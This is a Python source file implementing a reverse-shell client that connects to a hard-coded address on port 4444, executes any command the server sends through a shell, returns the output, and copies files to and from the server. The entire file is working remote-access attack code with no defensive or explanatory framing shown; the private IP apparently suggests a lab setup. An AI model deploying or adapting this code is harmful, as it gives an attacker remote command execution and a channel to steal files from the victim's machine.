import socket
import json
import os
import subprocess

def data_send(data):
    """Send data to the server."""
    jsondata = json.dumps(data)
    soc.send(jsondata.encode())

def data_recv():
    """Receive data from the server."""
    data = ''
    while True:
        try:
            data += soc.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file):
    """Receive a file from the server."""
    try:
        with open(file, 'wb') as f:
            soc.settimeout(5)
            while True:
                chunk = soc.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
    finally:
        soc.settimeout(None)

def upload_file(file):
    """Send a file to the server."""
    try:
        with open(file, 'rb') as f:
            while True:
                chunk = f.read(1024)
                if not chunk:
                    break
                soc.send(chunk)
    except FileNotFoundError:
        print(f"[!] File not found: {file}")

def shell():
    """Execute commands received from the server."""
    while True:
        comm = data_recv()
        if comm == 'exit':
            break
        elif comm == 'clear':
            pass  # No need to execute clear on the client
        elif comm.startswith('cd '):
            try:
                os.chdir(comm[3:])
                data_send(f"[+] Changed directory to {os.getcwd()}")
            except FileNotFoundError:
                data_send(f"[!] Directory not found: {comm[3:]}")
        elif comm.startswith('upload '):
            download_file(comm[7:])
        elif comm.startswith('download '):
            upload_file(comm[9:])
        else:
            try:
                exe = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                rcomm = exe.stdout.read() + exe.stderr.read()
                data_send(rcomm.decode())
            except Exception as e:
                data_send(f"[!] Error executing command: {e}")

# Client setup
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    soc.connect(('172.22.168.27', 4444))  # Replace with the server IP
    shell()
except Exception as e:
    print(f"[!] Error connecting to the server: {e}")
finally:
    soc.close()
